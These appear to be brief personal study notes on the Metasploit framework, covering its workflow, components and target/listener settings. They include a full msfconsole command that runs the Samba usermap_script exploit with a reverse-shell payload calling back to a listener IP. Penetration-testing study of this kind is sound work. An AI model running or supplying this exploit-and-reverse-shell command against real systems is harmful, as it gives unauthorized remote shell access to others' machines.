
*If I had eight hours to chop down a tree, I’d spend the first six of them sharpening my axe. -Abraham Lincoln*

Its a collection of exploits 
- its written in Ruby

1. port scanning / password sniffing 
	{msfconsole, use auxiliary/scanner/portscan/TCP, run}
2. vulv scanning
	 {search, info, use}
3. writing a exploit / pay-loading a already made exploit in the vulv
4. Post exploitation
5. Report


# Key Components

1. Exploits
2. Payload
3. Auxiliary Modules
4. Encoders
5. Nops


# Msfcli
Command line interface to the framework.
```shellsession
root@kali:~# msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"

```


# MSFconsole

Most popular interface to the metasploit framework



# Hosts
RHOST/RPORT -> target's IP
LHOST/LPORT -> our IP

